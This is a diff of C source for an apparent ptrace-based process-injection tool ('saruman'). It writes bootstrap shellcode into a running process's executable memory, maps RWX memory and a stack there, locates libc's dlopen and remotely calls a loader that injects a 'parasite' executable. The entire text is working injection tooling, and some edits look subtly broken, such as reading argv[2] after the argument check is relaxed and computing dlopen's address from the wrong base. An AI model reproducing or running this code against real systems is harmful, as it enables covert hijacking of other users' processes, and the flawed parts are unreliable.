@@ -13,7 +13,7 @@
 #define __NR_exit 60
 
 #define __PAYLOAD_ATTRIBUTES__	 __attribute__((aligned(8),__always_inline__))
-#define __PAYLOAD_KEYWORDS__ static inline volatile
+#define __PAYLOAD_KEYWORDS__ __PAYLOAD_ATTRIBUTES__ static inline volatile
 
 #define INIT_CODE_REGION 0x00C00000
 
@@ -22,14 +22,18 @@
 
 #define STACK_SIZE PAGE_SIZE * 4096
 
-#define RPC_REGION
+#define LIBC_PATH "/lib/x86_64-linux-gnu/libc.so.6"
 
 typedef struct saruman_ctx {
-	elfobj_t elfobj;
+	elfobj_t *elfobj;
 	struct user_regs_struct pt_regs;
 	struct user_regs_struct o_pt_regs;
 	pid_t pid;
 	char *exec_path;
+	uint64_t base_vaddr;
+	struct {
+		elfobj_t *elfobj;
+	} libc;
 	struct {
 		uint8_t *base;
 		uint64_t rsp, rbp;
@@ -46,6 +50,11 @@ typedef struct saruman_ctx {
 		uint64_t flags;
 	} task;
 	struct {
+		/*
+		 * Points to first r-xp region, not necessarily
+		 * the base of the program image which is read-only
+		 * on modern ELF
+		 */
 		uint64_t executable_base_addr;
 		size_t executable_len;
 	} bootstrap;
@@ -88,6 +97,7 @@ __PAYLOAD_KEYWORDS__ void * dlopen_loader(const char *path, uint64_t dlopen_addr
 	__RETURN_VALUE__(handle);
 	__BREAKPOINT__;
 }
+
 /*
  * A simplified load_elf_binary() function that loads the
  * position independent parasite executable into the remote
@@ -281,6 +291,10 @@ __PAYLOAD_KEYWORDS__ uint64_t bootstrap_code(void * vaddr, uint64_t size, void *
 			PROT_READ|PROT_WRITE|PROT_EXEC,
 			MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED,
 			-1, 0);
+	if (mem == MAP_FAILED) {
+		__RETURN_VALUE__(-1);
+		__BREAKPOINT__;
+	}
 
 	/*
 	 * Create stack segment that will be used by the parasite
@@ -291,6 +305,10 @@ __PAYLOAD_KEYWORDS__ uint64_t bootstrap_code(void * vaddr, uint64_t size, void *
 			PROT_READ|PROT_WRITE,
 			MAP_ANONYMOUS|MAP_PRIVATE|MAP_GROWSDOWN,
 			-1, 0);
+	if (mem == MAP_FAILED) {
+		__RETURN_VALUE__(-1);
+		__BREAKPOINT__;
+	}
 
 	__RETURN_VALUE__(mem);
 	__BREAKPOINT__;
@@ -474,9 +492,18 @@ bool saruman_find_bootloader_cave(struct saruman_ctx *ctx)
 	}
 	/*
 	 * Find the first instance of r-xp region of the main
-	 * executable.
+	 * executable. While we're at it find the first r--p region
+	 * with a '/' in the line-- that's our base address.
 	 */
 	while (fgets(buf, sizeof(buf), fp) != NULL) {
+		if (ctx->base_vaddr == 0 && strstr(buf, "r--p") != NULL &&
+		    strchr(buf, '/') != NULL) {
+			p = strchr(buf, '-');
+			*p = '\0';
+			ctx->base_vaddr = strtoul(buf, NULL, 16);
+			saruman_debug("ctx->base_vaddr: %#lx\n", ctx->base_vaddr);
+			continue;
+		}
 		if (strstr(buf, "r-xp") == NULL)
 			continue;
 		if (strchr(buf, '/') == NULL)
@@ -497,13 +524,13 @@ bool saruman_store_register_state(struct saruman_ctx *ctx)
 {
 	if (ptrace(PTRACE_GETREGS, ctx->task.pid, NULL, &ctx->o_pt_regs) < 0) {
 		perror("PTRACE_GETREGS");
-		return -1;
+		return false;
 	}
 
 	memcpy((void *)&ctx->pt_regs,
 	    (void *)&ctx->o_pt_regs,
 	    sizeof(struct user_regs_struct));
-	return 0;
+	return true;
 }
 
 void saruman_remote_call_init(struct saruman_rpc *rpc, void *fn, size_t fn_len,
@@ -532,13 +559,16 @@ bool saruman_remote_call(struct saruman_ctx *ctx, struct saruman_rpc *rpc)
 	addr = ctx->bootstrap_phase_complete ?
 	    PT_CALL_REGION : ctx->bootstrap.executable_base_addr;
 
+	saruman_debug("Writing %zu bytes from %p to %#lx\n", rpc->fn_len, rpc->fn, addr);
 	res = saruman_ptrace_write(ctx, (void *)addr, rpc->fn, rpc->fn_len);
 	if (res == false) {
 		fprintf(stderr, "saruman_ptrace_write() failed on pid %d\n", ctx->task.pid);
 		return false;
 	}
-	
-	ctx->pt_regs.rip = ctx->bootstrap.executable_base_addr;
+
+	saruman_debug("Setting pt_regs.rip to %#lx\n", addr);
+
+	ctx->pt_regs.rip = addr;
 	switch(rpc->argc) {
 	case 1:
 		pt_regs->rdi = (uintptr_t)rpc->args[0];
@@ -599,38 +629,61 @@ bool saruman_remote_call(struct saruman_ctx *ctx, struct saruman_rpc *rpc)
 	return true;
 }
 
-bool saruman_run_boostrap(struct saruman_ctx *ctx)
+bool saruman_run_bootstrap(struct saruman_ctx *ctx, uint64_t *retval)
 {
-	size_t len = sizeof(bootstrap_code);
 	struct saruman_rpc rpc;
 
 	saruman_debug("Writing %zu bytes of bootstrap code into %p\n",
-	    len, (void *)ctx->bootstrap.executable_base_addr);
+	     4096, (void *)ctx->bootstrap.executable_base_addr);
 
 	char *argv[] = {(void *)PT_CALL_REGION, (void *)PT_CALL_REGION_SIZE, (void *)0x0};
-	saruman_remote_call_init(&rpc, &bootstrap_code, sizeof(bootstrap_code), argv, 3);
+	saruman_remote_call_init(&rpc, &bootstrap_code, 1024, argv, 3);
 	if (saruman_remote_call(ctx, &rpc) == false) {
 		fprintf(stderr, "saruman_remote_call() failed on: run_bootstrap()\n");
 		return false;
 	}
 	ctx->bootstrap_phase_complete = true;
+	*retval = rpc.retval;
 	return true;
 }
 
-bool saruman_find_libc_dlopen(struct saruman_ctx *ctx)
+bool saruman_find_libc_dlopen(struct saruman_ctx *ctx, uint64_t *value)
 {
+	elf_error_t elf_error;
+	struct elf_symbol symbol;
 
-
+	if (ctx->libc.elfobj == NULL) {
+		ctx->libc.elfobj = malloc(sizeof(elfobj_t));
+		if (ctx->libc.elfobj == NULL) {
+			perror("malloc");
+			return false;
+		}
+		if (elf_open_object(LIBC_PATH, ctx->libc.elfobj,
+		    ELF_LOAD_F_STRICT, &elf_error) == false) {
+			fprintf(stderr, "elf_open_object() failed on %s: %s\n",
+			    LIBC_PATH, elf_error_msg(&elf_error));
+			return false;
+		}
+	}
+	if (elf_symbol_by_name(ctx->libc.elfobj, "dlopen", &symbol) == false) {
+		fprintf(stderr, "elf_symbol_by_name() failed on: \"dlopen\"\n");
+		return false;
+	}
+	symbol.value += ctx->base_vaddr;
+	memcpy(value, &symbol.value, sizeof(uint64_t));
+	return true;
 }
 
 int main(int argc, char **argv)
 {
 	struct saruman_ctx saruman;
 	struct saruman_rpc rpc;
+	uint64_t retval, dlopen_addr;
+	bool res;
 
 	memset(&saruman, 0, sizeof(saruman));
 
-	if (argc < 3) {
+	if (argc < 2) {
 		printf("Usage: %s <pid> <exec_path> <exec_args>\n", argv[0]);
 		exit(EXIT_FAILURE);
 	}
@@ -664,20 +717,30 @@ int main(int argc, char **argv)
 		exit(EXIT_FAILURE);
 	}
 	printf("Bootstrap executable region: %#lx - %#lx\n",
-	    saruman.bootstrap.executable_base_addr, saruman.bootstrap.executable_len);
+	    saruman.bootstrap.executable_base_addr,
+	    saruman.bootstrap.executable_base_addr + saruman.bootstrap.executable_len);
 
+	if (saruman_run_bootstrap(&saruman, &retval) == false) {
+		fprintf(stderr, "saruman_run_bootstrap() failed\n");
+		exit(EXIT_FAILURE);
+	}
+	saruman.stack.len = STACK_SIZE;
+	saruman.stack.base = (void *)retval;
+	saruman.stack.rsp = ((uint64_t)retval + saruman.stack.len);
+	printf("bootstrap complete, stack base: %p\n", saruman.stack.base);
 	/*
 	 * Call dlopen_loader(exec_path, exec_args, parasite_argc)
 	 */
 
-	uint64_t dlopen_addr = saruman_find_libc_dlopen(&saruman);
-	if (dlopen_addr == 0) {
+	res = saruman_find_libc_dlopen(&saruman, &dlopen_addr);
+	if (res == false) {
 		fprintf(stderr, "Failed to find dlopen()\n");
 		exit(EXIT_FAILURE);
 	}
 
+	printf("Calling dlopen_loader remotely, dlopen() is at %p\n", (void *)dlopen_addr);
 	char *dlopen_loader_args[] = {argv[2], (char *)dlopen_addr};
-	saruman_remote_call_init(&rpc, &dlopen_loader, sizeof(dlopen_loader),
+	saruman_remote_call_init(&rpc, &dlopen_loader, 1024,
 	    dlopen_loader_args, 2);
 	saruman_remote_call(&saruman, &rpc);
 }
